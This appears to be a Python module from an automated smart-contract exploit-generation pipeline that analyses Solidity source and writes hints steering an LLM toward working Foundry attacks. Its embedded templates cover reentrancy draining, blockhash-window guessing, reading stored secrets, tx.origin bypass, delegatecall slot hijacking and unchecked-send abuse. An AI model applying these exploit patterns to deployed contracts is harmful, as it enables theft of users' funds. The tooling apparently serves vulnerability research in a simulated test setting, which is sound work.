"""
prompt_enhancer.py
==================
Analyzes a target contract and generates context-aware hints that help
the exploit-generation LLM produce working Foundry-compatible attacks
without hardcoded templates.

Each analyzer returns a string block (or empty string) that is appended
to the attack query before it reaches the LLM.  The analyzers are
independent and composable: callers invoke ``build_enhanced_prompt()``
with the contract source and vulnerability class, and get back a single
combined hint block.
"""

import re
from typing import List, Optional


# ── FOUNDRY CHEATCODE REFERENCE ────────────────────────────────────
# This block is always appended. It gives the LLM concrete syntax for
# Vm cheatcodes that the attacker contract can use directly.

CHEATCODE_REFERENCE = r"""
FOUNDRY_CHEATCODE_REFERENCE (use these inside your attacker contract):

Your attacker contract CAN call Foundry cheatcodes directly by declaring
the Vm interface and instantiating it at the hevm cheat-code address.
Paste this at the top of your attacker_solidity (inside the file, before
the contract):

  interface Vm {
      function roll(uint256) external;
      function warp(uint256) external;
      function load(address, bytes32) external view returns (bytes32);
      function store(address, bytes32, bytes32) external;
      function prank(address) external;
      function startPrank(address) external;
      function stopPrank() external;
  }

Inside your attacker contract, declare:

  Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

Then call cheatcodes as needed:

  vm.roll(block.number + 257);          // advance block number
  vm.warp(block.timestamp + 1 days);    // advance timestamp
  bytes32 val = vm.load(target, bytes32(0));  // read storage slot 0
  vm.store(target, bytes32(0), bytes32(uint256(42)));  // write slot
  vm.prank(someAddress);                // next call comes from someAddress
  vm.startPrank(addr); ...; vm.stopPrank();  // multi-call prank

IMPORTANT: These calls work INSIDE the attacker contract.  You do NOT
need the harness to call them for you.  Use them whenever the exploit
requires block advancement, storage reads, or caller impersonation.

REENTRANCY ATTACKS — MANDATORY DEPTH LIMIT:
If your attacker uses a fallback/receive function to re-enter the target,
you MUST limit the recursion depth with a counter.  Without a limit the
reentrancy loop exhausts all gas and the test fails with OutOfGas.

Example pattern:
  uint256 private reentrancyCount;
  uint256 public attackAmount;

  function attack() public payable {
      attackAmount = msg.value;
      // deposit first, then collect to trigger reentrancy
      address(target).call.value(msg.value)(abi.encodeWithSignature("Deposit()"));
      address(target).call(abi.encodeWithSignature("Collect(uint256)", attackAmount));
  }

  function() public payable {
      if (reentrancyCount < 5) {
          reentrancyCount++;
          address(target).call(abi.encodeWithSignature("Collect(uint256)", attackAmount));
      }
  }

CRITICAL REENTRANCY RULES:
- NEVER omit the depth check.  5 re-entries is enough to prove the bug.
- In the fallback, use a STORED state variable (attackAmount) for the
  collect amount.  Do NOT call target.balances() or any view function
  on the target inside the fallback — it triggers StateChangeDuringStaticCall.
- value_wei MUST be at least 1000000000000000000 (1 ether) for reentrancy.
"""


# ── CONTRACT ANALYZERS ─────────────────────────────────────────────

def _strip_comments(src: str) -> str:
    s = re.sub(r"//.*?$", "", src, flags=re.M)
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    return s


def analyze_initialization_sequence(contract_src: str) -> str:
    """Detect initialization functions that must be called before the
    contract is usable.  Also extract helper contract interfaces that
    the attacker needs to deploy as stubs."""
    clean = _strip_comments(contract_src)

    init_keywords = [
        "init", "initialize", "setup", "setUp", "configure",
        "SetMinSum", "SetLogFile", "Initialized", "initTokenBank",
        "initWallet",
    ]

    init_fns: List[str] = []
    for kw in init_keywords:
        pat = re.compile(
            rf"function\s+({re.escape(kw)}[A-Za-z0-9_]*)\s*\(([^)]*)\)",
            re.I,
        )
        for m in pat.finditer(clean):
            fn_name = m.group(1)
            params = m.group(2).strip()
            if fn_name.lower() == "constructor":
                continue
            sig = f"{fn_name}({params})" if params else f"{fn_name}()"
            if sig not in init_fns:
                init_fns.append(sig)

    if not init_fns:
        return ""

    # Reorder: functions guarded by require(!initialized) must come
    # BEFORE the function that sets initialized=true.  Detect which
    # init functions are guarded and which set the flag.
    guarded_fns = []
    flag_setters = []
    other_fns = []
    for sig in init_fns:
        fn_name = sig.split("(")[0]
        # Find function body
        fn_body_match = re.search(
            rf"function\s+{re.escape(fn_name)}\s*\([^)]*\)[^{{]*\{{([^}}]*)\}}",
            clean, re.S,
        )
        if fn_body_match:
            body = fn_body_match.group(1)
            if re.search(r"require\s*\(\s*!\s*\w+\s*\)", body):
                guarded_fns.append(sig)
            elif re.search(r"\w+\s*=\s*true", body) and len(body.strip().split('\n')) <= 3:
                flag_setters.append(sig)
            else:
                other_fns.append(sig)
        else:
            other_fns.append(sig)

    # Correct order: guarded first, then other, then flag setters last
    init_fns = guarded_fns + other_fns + flag_setters

    lines = ["INITIALIZATION_SEQUENCE_HINT:"]
    lines.append(
        "This contract has initialization functions that MUST be called "
        "before the main functionality works.  Call these in the attacker's "
        "CONSTRUCTOR (not in attack()), in this exact order:"
    )
    for i, sig in enumerate(init_fns, 1):
        lines.append(f"  {i}. {sig}")
    lines.append("")
    lines.append(
        "CRITICAL: The attacker has NO ETH in its constructor (ETH arrives "
        "later via attack()). Therefore:"
    )
    lines.append(
        "  - Call ONLY the init functions above in the constructor"
    )
    lines.append(
        "  - Do NOT call Deposit() or any payable function in the constructor"
    )
    lines.append(
        "  - Put Deposit/value-sending calls in attack() which receives "
        "ETH from the harness"
    )
    lines.append(
        "  - Set MinSum to 0 in SetMinSum(0) so any deposit amount works"
    )

    # Extract helper contract interfaces from the same file
    # Find state variables that reference other contracts in this file
    state_type_refs = re.findall(
        r"^\s*(\w+)\s+(?:public\s+|private\s+|internal\s+)?(\w+)\s*;",
        contract_src, re.M,
    )
    # Find contracts defined in the same file
    defined_contracts = re.findall(
        r"(?:contract|interface)\s+(\w+)\s*(?:is\s+[^{]*)?\{",
        contract_src,
    )
    main_contract = defined_contracts[0] if defined_contracts else ""

    helper_stubs = []
    for type_name, var_name in state_type_refs:
        if type_name in defined_contracts and type_name != main_contract:
            # This state var references a helper contract in the same file
            # Extract the helper's functions
            helper_fns = _extract_helper_functions(contract_src, type_name)
            if helper_fns:
                helper_stubs.append((type_name, var_name, helper_fns))

    if helper_stubs:
        lines.append("")
        lines.append("HELPER_CONTRACT_STUBS:")
        lines.append(
            "Init functions take addresses of helper contracts. You MUST "
            "deploy these stubs in your attacker. Here are the interfaces:"
        )
        for type_name, var_name, fns in helper_stubs:
            lines.append(f"\n  // Stub for {type_name} (used as '{var_name}'):")
            lines.append(f"  contract Attacker{type_name} {{")
            for fn_sig, fn_params, fn_body_hint in fns:
                lines.append(f"    {fn_sig} public {{")
                if fn_body_hint:
                    lines.append(f"      {fn_body_hint}")
                lines.append(f"    }}")
            lines.append(f"  }}")
        lines.append(
            "\nDeploy the stub in your attacker's constructor and pass its "
            "address to the init function.  Example:"
        )
        lines.append(
            "  Attacker" + helper_stubs[0][0] + " helper = new Attacker"
            + helper_stubs[0][0] + "();"
        )
        lines.append(
            "  ITarget(target)." + [s for s in init_fns
            if "address" in s.lower() or "log" in s.lower()
            or "file" in s.lower()][0].split("(")[0]
            + "(address(helper));"
            if any("address" in s.lower() or "log" in s.lower()
                   or "file" in s.lower() for s in init_fns)
            else ""
        )
    else:
        lines.append(
            "If an init function takes an address parameter, deploy a helper "
            "contract that satisfies the interface and pass its address."
        )

    return "\n".join(lines)


def _extract_helper_functions(
    contract_src: str, type_name: str
) -> List[tuple]:
    """Extract function signatures from a helper contract defined in
    the same source file.  Returns [(signature, params, body_hint), ...]."""
    # Find the contract body
    pat = re.compile(
        rf"(?:contract|interface)\s+{re.escape(type_name)}\s*"
        rf"(?:is\s+[^{{]*)?\{{",
        re.S,
    )
    m = pat.search(contract_src)
    if not m:
        return []

    start = m.end()
    depth = 1
    i = start
    while i < len(contract_src) and depth > 0:
        if contract_src[i] == '{':
            depth += 1
        elif contract_src[i] == '}':
            depth -= 1
        i += 1
    body = contract_src[start:i - 1]

    fns = re.findall(
        r"function\s+(\w+)\s*\(([^)]*)\)\s*([^{;]*)",
        body,
    )
    results = []
    for fname, params, mods in fns:
        # Build a minimal signature
        param_str = params.strip()
        sig = f"function {fname}({param_str})"

        # Determine return type
        ret = ""
        ret_match = re.search(r'returns\s*\(([^)]*)\)', mods)
        if ret_match:
            ret = ret_match.group(1).strip()
            sig += f" returns ({ret})"

        # Body hint: for struct-pushing functions, provide a minimal impl
        body_hint = ""
        if "push" in body.lower() or "struct" in body.lower():
            body_hint = "// minimal no-op stub"

        results.append((sig, param_str, body_hint))

    return results


def analyze_modifier_callbacks(contract_src: str) -> str:
    """Extract modifier bodies that make external calls.  When a
    modifier calls msg.sender.someFunction(), the attacker must
    implement that callback for the exploit to work."""
    clean = _strip_comments(contract_src)

    modifier_pat = re.compile(
        r"modifier\s+(\w+)\s*(?:\([^)]*\))?\s*\{([^}]*)\}", re.S
    )
    callbacks: List[str] = []
    for m in modifier_pat.finditer(clean):
        mod_name = m.group(1)
        body = m.group(2)
        # Look for external calls in modifier body
        ext_calls = re.findall(
            r"(\w+)\s*\(\s*msg\.sender\s*\)\s*\.\s*(\w+)\s*\(",
            body,
        )
        if ext_calls:
            for cast_type, fn_name in ext_calls:
                callbacks.append(
                    f"modifier '{mod_name}' calls "
                    f"{cast_type}(msg.sender).{fn_name}()"
                )
        # Also look for require() with external calls
        req_ext = re.findall(
            r"require\s*\([^)]*(?:msg\.sender|Bank\(msg\.sender\))"
            r"\s*\.\s*(\w+)\s*\(",
            body,
        )
        for fn_name in req_ext:
            callbacks.append(
                f"modifier '{mod_name}' requires msg.sender to implement "
                f"{fn_name}()"
            )
        # Direct pattern: Type(msg.sender).fn()
        direct = re.findall(
            r"([A-Z]\w+)\s*\(\s*msg\.sender\s*\)\s*\.\s*(\w+)\s*\(",
            body,
        )
        for cast_type, fn_name in direct:
            entry = (
                f"modifier '{mod_name}' calls "
                f"{cast_type}(msg.sender).{fn_name}()"
            )
            if entry not in callbacks:
                callbacks.append(entry)

    if not callbacks:
        return ""

    lines = ["MODIFIER_CALLBACK_HINT:"]
    lines.append(
        "This contract has modifiers that make EXTERNAL CALLS back to "
        "msg.sender.  Your attacker contract MUST implement the required "
        "callback functions for the modifier to pass:"
    )
    for cb in callbacks:
        lines.append(f"  - {cb}")
    lines.append(
        "Implement these callback functions in your attacker contract.  "
        "If the callback returns a specific value (e.g. a hash), compute "
        "and return it.  For reentrancy exploits via modifier callbacks: "
        "in the callback, re-enter the vulnerable function before returning "
        "the expected value."
    )

    # Extract the actual modifier source for the LLM to read
    for m in modifier_pat.finditer(clean):
        mod_name = m.group(1)
        body = m.group(2).strip()
        if "msg.sender" in body:
            lines.append(f"\nModifier '{mod_name}' source:")
            lines.append(f"  modifier {mod_name} {{")
            for ln in body.splitlines():
                lines.append(f"    {ln.strip()}")
            lines.append("  }")

    return "\n".join(lines)


def analyze_dos_patterns(contract_src: str) -> str:
    """Detect unbounded array growth or loop patterns typical of DoS
    contracts.  Instruct the LLM to generate multi-call attack sequences."""
    clean = _strip_comments(contract_src)

    # Detect push operations inside loops or unbounded push calls
    has_push = bool(re.search(r"\.\s*push\s*\(", clean))
    has_unbounded_loop = bool(re.search(
        r"for\s*\(\s*uint\s+\w+\s*=\s*0\s*;\s*\w+\s*<\s*\w+\s*;",
        clean,
    ))
    has_array_growth = bool(re.search(
        r"(address|uint|int)\s*\[\s*\]\s+(public\s+)?(\w+)",
        clean,
    ))
    has_delete_or_clear = bool(re.search(
        r"(delete\s+\w+|new\s+\w+\s*\[\s*\]\s*\(\s*0\s*\))",
        clean,
    ))

    if not (has_push or has_array_growth):
        return ""

    lines = ["DOS_MULTI_CALL_HINT:"]
    lines.append(
        "This contract has UNBOUNDED ARRAY GROWTH.  A denial-of-service "
        "attack requires MULTIPLE calls to the growth function to fill the "
        "array past gas limits.  Your attacker's attack() function should:"
    )
    lines.append("  1. Call the array-growing function MULTIPLE times in a loop")
    lines.append("     (e.g. 5-10 iterations to push thousands of entries)")
    lines.append("  2. Record the array length before and after to prove growth")
    lines.append(
        "  3. The vulnerability is that ANYONE can grow the array without "
        "     bound, making operations like iteration or deletion exceed "
        "     the block gas limit"
    )
    if has_delete_or_clear:
        lines.append(
            "  4. This contract has a clear/reset function that iterates the "
            "     array — once the array is large enough, that function "
            "     exceeds block gas limits (30M gas)"
        )
    lines.append(
        "\nDo NOT send ETH for DoS attacks (attack() should NOT be payable "
        "unless the target function requires it).  The impact is liveness "
        "degradation, not fund theft."
    )
    return "\n".join(lines)


def analyze_blockhash_vulnerability(contract_src: str) -> str:
    """Detect blockhash-dependent logic and instruct the LLM on the
    256-block window exploit with a concrete code template."""
    clean = _strip_comments(contract_src)

    has_blockhash = bool(re.search(
        r"block\s*\.\s*blockhash\s*\(|blockhash\s*\(", clean
    ))

    if not has_blockhash:
        return ""

    # Detect payable functions that store block.number (the lock-in step)
    payable_fns = re.findall(
        r"function\s+(\w+)\s*\([^)]*\)\s*[^{]*payable", clean
    )
    # Detect functions that check blockhash (the settlement step)
    settle_fns = re.findall(
        r"function\s+(\w+)\s*\([^)]*\)[^{]*\{[^}]*blockhash",
        clean, re.S,
    )

    lock_fn = payable_fns[0] if payable_fns else "lockInGuess"
    settle_fn = settle_fns[0] if settle_fns else "settle"

    # Detect if lock-in requires msg.value
    requires_eth = bool(re.search(
        r"require\s*\(\s*msg\.value\s*==\s*(\d+\s*ether|\d+)",
        clean,
    ))
    eth_match = re.search(
        r"require\s*\(\s*msg\.value\s*==\s*(\d+\s*ether|\d+)",
        clean,
    )
    eth_amount = eth_match.group(1) if eth_match else "1 ether"

    # Detect the block offset: contracts often store
    # settlementBlockNumber = block.number + N, and the settle function
    # checks block.number > settlementBlockNumber + M.
    # We need vm.roll(block.number + 256 + N + M + 2) to ensure
    # blockhash(settlementBlockNumber) returns 0x0.
    block_offset = 0
    # Pattern: = block.number + N
    offset_match = re.search(
        r"block\.number\s*\+\s*(\d+)", clean
    )
    if offset_match:
        block_offset += int(offset_match.group(1))
    # Pattern: require(block.number > varName + M)
    settle_offset_match = re.search(
        r"require\s*\(\s*block\.number\s*>\s*\w+\s*\+\s*(\d+)", clean
    )
    if settle_offset_match:
        block_offset += int(settle_offset_match.group(1))
    # Total roll: 256 (blockhash window) + offsets + safety margin
    roll_amount = 256 + block_offset + 2

    lines = ["BLOCKHASH_EXPLOIT_HINT:"]
    lines.append(
        "This contract uses blockhash() which returns 0x0 for blocks more "
        "than 256 blocks in the past."
    )
    lines.append("")
    lines.append("COMPLETE ATTACK PATTERN (follow this exactly):")
    lines.append("")
    lines.append("  interface Vm {")
    lines.append("      function roll(uint256) external;")
    lines.append("  }")
    lines.append(
        '  Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));'
    )
    lines.append("")
    lines.append("  // attack() MUST be payable to receive ETH from the harness")
    lines.append("  function attack() public payable {")
    if requires_eth:
        lines.append(
            f"      // Step 1: lock in guess of bytes32(0), sending {eth_amount}"
        )
        lines.append(
            f'      address(target).call.value({eth_amount})'
            f'(abi.encodeWithSignature("{lock_fn}(bytes32)", bytes32(0)));'
        )
    else:
        lines.append(
            f"      // Step 1: lock in guess of bytes32(0)"
        )
        lines.append(
            f'      address(target).call'
            f'(abi.encodeWithSignature("{lock_fn}(bytes32)", bytes32(0)));'
        )
    lines.append("")
    lines.append(
        f"      // Step 2: advance {roll_amount} blocks so blockhash returns 0x0"
    )
    lines.append(
        f"      // (256 for blockhash window + {block_offset} for contract's "
        f"block offset + 2 safety)"
    )
    lines.append(f"      vm.roll(block.number + {roll_amount});")
    lines.append("")
    lines.append(
        "      // Step 3: settle — blockhash() returns 0x0, matching guess"
    )
    lines.append(
        f'      address(target).call'
        f'(abi.encodeWithSignature("{settle_fn}()"));'
    )
    lines.append("  }")
    lines.append("")
    lines.append("  // MUST have receive() to accept ETH payout from target")
    lines.append("  function() public payable {}")
    lines.append("")
    lines.append("CRITICAL REQUIREMENTS:")
    lines.append("  - attack() MUST be 'payable' so it can receive ETH from harness")
    lines.append(
        f"  - The call to {lock_fn} MUST use .value({eth_amount}) syntax "
        f"to send ETH"
    )
    lines.append(
        f"  - vm.roll(block.number + {roll_amount}) MUST appear BETWEEN "
        f"the lock-in and settlement calls — do NOT use a smaller number"
    )
    lines.append(
        "  - The contract MUST have a fallback or receive function to "
        "accept the ETH payout"
    )
    lines.append(
        f"  - value_wei in the JSON MUST be at least 2000000000000000000 "
        f"(2 ether) so the attacker has enough ETH to pay the "
        f"{eth_amount} lock-in fee and still measure profit"
    )
    lines.append(
        "  - Mark the contract with '// NO_TARGET_IMPORT' if you declare "
        "the Vm interface yourself"
    )
    return "\n".join(lines)


def analyze_stored_secret(contract_src: str) -> str:
    """Detect 'private' variables used as secrets that can be read via
    vm.load().  Distinguishes constructor-time secrets (must use vm.load)
    from call-time randomness (can replicate in same tx)."""
    clean = _strip_comments(contract_src)

    privates = re.findall(
        r"(uint\d*|int\d*|bytes\d*|address|bool)\s+"
        r"(?:private\s+)?(\w+)\s*(?:=|;)",
        contract_src,
    )
    secret_vars = []
    for vtype, vname in privates:
        if re.search(rf"\b{re.escape(vname)}\b", clean):
            if re.search(
                rf"==\s*{re.escape(vname)}\b|{re.escape(vname)}\s*==",
                clean,
            ):
                secret_vars.append((vtype, vname))

    answer_pat = re.findall(
        r"(uint\d*|bytes\d*)\s+(answer|secret|key|password|solution)\b",
        contract_src, re.I,
    )
    for vtype, vname in answer_pat:
        if (vtype, vname) not in secret_vars:
            secret_vars.append((vtype, vname))

    if not secret_vars:
        return ""

    secret_set_in_constructor = False
    for _, vname in secret_vars:
        ctor_bodies = re.findall(
            r"(?:constructor|function\s+\w+)\s*\([^)]*\)\s*(?:public\s+)?payable\s*\{([^}]*)\}",
            clean, re.S,
        )
        for body in ctor_bodies:
            if re.search(rf"\b{re.escape(vname)}\s*=", body):
                secret_set_in_constructor = True

    all_state_vars = re.findall(
        r"^\s*(?:uint\d*|int\d*|bytes\d*|address|bool|string|mapping)"
        r"\s+(?:public|private|internal)?\s*(\w+)",
        contract_src, re.M,
    )

    lines = ["STORAGE_READ_EXPLOIT_HINT:"]

    if secret_set_in_constructor:
        lines.append(
            "WARNING: The secret value was computed in the CONSTRUCTOR at "
            "deploy time.  You CANNOT replicate the computation because "
            "block.number and block.timestamp were different then.  You "
            "MUST use vm.load() to read the stored value directly."
        )
        lines.append(
            "DO NOT try to recompute keccak256(blockhash, now) — it will "
            "give a WRONG answer because the block context has changed."
        )
    else:
        lines.append(
            "This contract stores a secret value in a state variable. "
            "On-chain storage is NEVER truly private — read it with vm.load()."
        )

    has_transfer = bool(re.search(
        r"\.transfer\s*\(|\.send\s*\(|\.call\.value\s*\(", clean
    ))
    # Find all payable functions, skip old-style constructors
    contract_names = set(re.findall(r"contract\s+(\w+)", contract_src))
    payable_fn_match = None
    for m in re.finditer(
        r"function\s+(\w+)\s*\(([^)]*)\)\s*[^{]*payable", clean
    ):
        fn_name = m.group(1)
        if fn_name not in contract_names:  # skip old-style constructors
            payable_fn_match = m
            break
    eth_match = re.search(
        r"require\s*\(\s*msg\.value\s*==\s*(\d+\s*ether|\d+)", clean
    )
    eth_amount = eth_match.group(1) if eth_match else "1 ether"
    guess_fn = payable_fn_match.group(1) if payable_fn_match else "guess"
    guess_params = payable_fn_match.group(2).strip() if payable_fn_match else ""
    arg_type = guess_params.split()[0] if guess_params else ""

    lines.append("")
    lines.append("COMPLETE ATTACK PATTERN (follow this exactly):")
    lines.append("")
    lines.append("  interface Vm {")
    lines.append("      function load(address, bytes32) external view returns (bytes32);")
    lines.append("  }")
    lines.append(
        '  Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));'
    )
    lines.append("")
    lines.append("  function attack() public payable {")

    for vtype, vname in secret_vars:
        slot = "0"
        if vname in all_state_vars:
            idx = all_state_vars.index(vname)
            slot = str(idx)
        lines.append(f"      bytes32 raw = vm.load(address(target), bytes32(uint256({slot})));")
        lines.append(f"      {vtype} val = {vtype}(uint256(raw));")

    if has_transfer and payable_fn_match and arg_type:
        lines.append(
            f'      address(target).call.value({eth_amount})'
            f'(abi.encodeWithSignature("{guess_fn}({arg_type})", val));'
        )

    lines.append("  }")
    lines.append("")
    lines.append("  function() public payable {}")
    lines.append("")
    lines.append("CRITICAL REQUIREMENTS:")
    lines.append("  - attack() MUST be payable")
    lines.append(
        f"  - The .call.value() MUST send EXACTLY {eth_amount} — not "
        f"msg.value, not 2 ether, EXACTLY {eth_amount}. The target has "
        f"require(msg.value == {eth_amount}) which rejects any other amount."
    )
    lines.append("  - MUST have a fallback payable function to receive ETH")
    lines.append("  - value_wei MUST be at least 2000000000000000000 (2 ether)")
    lines.append("  - Use vm.load() to read the secret — DO NOT recompute it")
    return "\n".join(lines)


def analyze_predictable_randomness(contract_src: str) -> str:
    """Detect on-chain randomness patterns that can be replicated by an
    attacker contract in the same transaction."""
    clean = _strip_comments(contract_src)

    rng_sources = []
    if re.search(r"block\s*\.\s*timestamp|now\b", clean):
        rng_sources.append("block.timestamp / now")
    if re.search(r"block\s*\.\s*number", clean):
        rng_sources.append("block.number")
    if re.search(r"block\s*\.\s*(?:blockhash|difficulty|prevrandao)", clean):
        rng_sources.append("blockhash / block.difficulty / block.prevrandao")
    if re.search(r"block\s*\.\s*coinbase", clean):
        rng_sources.append("block.coinbase")

    has_keccak = bool(re.search(r"keccak256\s*\(", clean))

    if not rng_sources:
        return ""

    lines = ["PREDICTABLE_RANDOMNESS_HINT:"]
    lines.append(
        "This contract derives 'random' values from on-chain sources that "
        "are fully predictable within the same block:"
    )
    for src in rng_sources:
        lines.append(f"  - {src}")
    if has_keccak:
        lines.append(
            "  - These values are passed to keccak256() — but the hash is "
            "    deterministic given the same inputs"
        )
    lines.append(
        "\nYour attacker contract can REPLICATE the exact same computation "
        "in the same transaction to predict the outcome.  Strategy:"
    )
    lines.append(
        "  1. Compute the expected 'random' result using the same formula"
    )
    lines.append(
        "  2. Only call the target if the predicted outcome is favorable"
    )
    lines.append(
        "  3. Since both contracts execute in the same block, block.timestamp "
        "     and block.number are identical"
    )
    return "\n".join(lines)


def analyze_tx_origin(contract_src: str) -> str:
    """Detect tx.origin checks that prevent direct contract calls."""
    clean = _strip_comments(contract_src)

    has_tx_origin = bool(re.search(r"tx\.origin", clean))
    if not has_tx_origin:
        return ""

    # Check if tx.origin is used in a modifier or require
    in_modifier = bool(re.search(
        r"modifier\s+\w+[^}]*tx\.origin", clean, re.S
    ))
    in_require = bool(re.search(
        r"require\s*\([^)]*tx\.origin", clean
    ))

    lines = ["TX_ORIGIN_HINT:"]
    if in_modifier or in_require:
        lines.append(
            "This contract uses tx.origin for authentication, which means "
            "direct calls from a contract will FAIL because msg.sender != "
            "tx.origin.  To bypass this in Foundry:"
        )
        lines.append(
            "  1. Use vm.prank(someEOA) before calling the target, so both "
            "     msg.sender and tx.origin become someEOA"
        )
        lines.append(
            "  2. Or use vm.startPrank(someEOA) for multiple calls"
        )
        lines.append(
            "  3. Alternatively, make the attack() function call the target "
            "     via low-level call preceded by vm.prank(tx.origin)"
        )
    else:
        lines.append(
            "This contract references tx.origin but not in a guard.  "
            "The tx.origin authentication pattern is itself a vulnerability "
            "(SWC-115) — a phishing contract can relay a legitimate user's "
            "tx.origin to bypass the check."
        )
    return "\n".join(lines)


def analyze_library_dependencies(contract_src: str) -> str:
    """Detect library usage that may cause Foundry linking issues."""
    clean = _strip_comments(contract_src)

    libraries = re.findall(r"library\s+(\w+)\s*\{", clean)
    using_for = re.findall(r"using\s+(\w+)\s+for\s+(\w+)", clean)

    if not libraries:
        return ""

    lines = ["LIBRARY_DEPENDENCY_HINT:"]
    lines.append(
        "This contract declares internal libraries: " +
        ", ".join(libraries) + "."
    )
    if using_for:
        for lib, typ in using_for:
            lines.append(f"  - 'using {lib} for {typ}' is declared")
    lines.append(
        "Internal libraries with 'internal' functions are inlined by the "
        "compiler and do NOT need separate deployment or linking.  However, "
        "if you see Foundry linking errors, the contract source may need "
        "the library code included in the same file."
    )
    lines.append(
        "Your attacker contract should NOT try to import or use these "
        "libraries — interact with the target only via its external "
        "interface (function calls)."
    )
    return "\n".join(lines)


def analyze_delegatecall(contract_src: str) -> str:
    """Detect delegatecall patterns that can be exploited via storage
    slot manipulation."""
    clean = _strip_comments(contract_src)

    has_delegatecall = bool(re.search(r"delegatecall\s*\(", clean))
    if not has_delegatecall:
        return ""

    # Check if delegatecall target is a state variable (user-controllable)
    state_vars = re.findall(
        r"(address)\s+(?:public\s+)?(\w+)\s*;", contract_src
    )
    delegatecall_targets = re.findall(
        r"(\w+)\s*\.\s*delegatecall\s*\(", clean
    )

    lines = ["DELEGATECALL_EXPLOIT_HINT:"]
    lines.append(
        "This contract uses delegatecall, which executes external code in "
        "the context of the calling contract (same storage, same msg.sender)."
    )
    lines.append("  EXPLOIT STRATEGIES:")
    lines.append(
        "  1. If the delegatecall target address is stored in a state variable "
        "     at slot N, overwrite that slot (via a function that writes to "
        "     the same slot via delegatecall) to point to your malicious contract"
    )
    lines.append(
        "  2. Deploy a malicious library contract whose function overwrites "
        "     the target's storage slot 0 (or whichever slot holds the library "
        "     address) to redirect future delegatecalls"
    )
    lines.append(
        "  3. The fallback function often delegates to the library — calling a "
        "     non-existent function triggers the fallback and thus the delegatecall"
    )
    return "\n".join(lines)


def analyze_unchecked_calls(contract_src: str, target_function: str) -> str:
    """Detect unchecked .send() / .call.value() patterns."""
    clean = _strip_comments(contract_src)

    unchecked_send = re.findall(
        r"(\w+)\s*\.\s*send\s*\(([^)]*)\)\s*;", clean
    )
    unchecked_call = re.findall(
        r"(\w+)\s*\.\s*call\s*\.?\s*value\s*\([^)]*\)\s*\([^)]*\)\s*;",
        clean,
    )

    if not unchecked_send and not unchecked_call:
        return ""

    lines = ["UNCHECKED_CALL_EXPLOIT_HINT:"]
    lines.append(
        "This contract performs ETH transfers whose return value is IGNORED:"
    )
    for recv, amt in unchecked_send:
        lines.append(f"  - {recv}.send({amt}) — return value not checked")
    for recv in unchecked_call:
        lines.append(f"  - {recv}.call.value()() — return value not checked")
    lines.append(
        "\nTo exploit: your attacker must become the RECIPIENT of the "
        "unchecked transfer, then REJECT the ETH (use a receive() that "
        "reverts, or omit receive()/fallback entirely).  Steps:"
    )
    lines.append(
        "  1. Make the attacker contract the payment recipient (call the "
        "     function that sets the beneficiary/king/whale to the attacker)"
    )
    lines.append(
        "  2. Have the attacker's receive() function revert: "
        "     receive() external payable { revert(); }"
    )
    lines.append(
        "  3. Trigger the payment function — the .send()/.call() silently "
        "     fails but the contract's state still advances as if it succeeded"
    )
    lines.append(
        "  4. The funds are now stranded in the target contract"
    )
    return "\n".join(lines)


# ── MAIN ENTRY POINT ──────────────────────────────────────────────

def build_enhanced_prompt(
    contract_src: str,
    vuln_class: str = "",
    target_function: str = "",
) -> str:
    """Build the combined enhancement block for the exploit generation
    prompt.  Returns a string to append after the main attack query."""

    blocks: List[str] = []

    # Always include cheatcode reference
    blocks.append(CHEATCODE_REFERENCE)

    # Run all analyzers
    analyzers = [
        analyze_initialization_sequence(contract_src),
        analyze_modifier_callbacks(contract_src),
        analyze_blockhash_vulnerability(contract_src),
        analyze_stored_secret(contract_src),
        analyze_predictable_randomness(contract_src),
        analyze_tx_origin(contract_src),
        analyze_delegatecall(contract_src),
        analyze_library_dependencies(contract_src),
    ]

    # Class-specific analyzers
    if vuln_class in ("denial_of_service", "dos"):
        analyzers.append(analyze_dos_patterns(contract_src))
    else:
        # Still run it but only include if patterns are strong
        dos_hint = analyze_dos_patterns(contract_src)
        if dos_hint:
            analyzers.append(dos_hint)

    if vuln_class == "unchecked_call":
        analyzers.append(
            analyze_unchecked_calls(contract_src, target_function)
        )

    for block in analyzers:
        if block:
            blocks.append(block)

    return "\n\n".join(blocks)
